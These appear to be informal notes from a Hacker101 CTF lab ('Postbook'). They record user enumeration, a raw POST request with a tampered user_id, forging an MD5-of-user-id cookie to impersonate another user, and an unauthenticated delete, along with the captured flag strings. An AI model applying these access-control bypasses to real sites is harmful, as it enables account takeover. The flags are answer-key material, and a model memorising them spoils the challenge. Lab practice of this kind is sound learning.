https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/


https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=sign_in.php
post request to sign in page with false creds = 

```You've entered a wrong username/password combination. Please do not hack our system because it is insanely illegal. We will report you to PETA if you continue. Nothing is logged, but we ask you kindly not to try anything malicious.```

No loggin yeah!


sign up page https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=sign_up.php




```Sign up
Please only use fake and temporary credentials. All of the information stored is this system is considered to be open to everyone.

Usernames should be lowercase characters only.
```

https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=profile.php&id=c

Username = user

https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=profile.php&id=b

username = admin

https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=profile.php&id=a

username = ''


Flag0 discovered 
https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=view.php&id=2

^FLAG^c4969316ab68bd2180e22322d3e58819cd197337a920ca40b9f7ab3daea30a08$FLAG$

SECRET: [Dear diary...](https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=view.php&id=2)  
I am so glad that I am on Postbook. I can finally write down my thoughts and no one can see them. See you tomorrow. Yours truly, admin  
Author: admin


FLAG1 found 

POST /index.php?page=create.php HTTP/2
Host: 8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com
Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://8f40e9166681e12f02dce6086d5dae4d.ctf.hacker101.com/index.php?page=create.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

title=test2&body=testing&private=on&user_id=2
-----------------------
since my id is 3, changing the last parameter to 2 allows me to post to another users posts

^FLAG^e3db759e0e6088270cbb33e29b1eedf7cfc37d24a527ce00f4d027892649c5ca$FLAG$
^FLAG^c4969316ab68bd2180e22322d3e58819cd197337a920ca40b9f7ab3daea30a08$FLAG$

flag 2 edit someones post by changing id in request
^FLAG^ab23c257656238fd38cfb2f6d5da82085c2513f74669e4d60f9f738a635bb356$FLAG$

FLAG 4 -change my cookie (md5 hash of userid "3" to user id "4")
^FLAG^b48a602a1b4421829b38f021ff0f8d8540570db7cec595bfc2abb735e314bdc4$FLAG$

flag 5 - the delete button uses a hash of the post id number and doesnt care about user cookie

^FLAG^fd51b280c89c2174da365d6b01feb4b2c1b2209843741e0d67188bc666327d06$FLAG$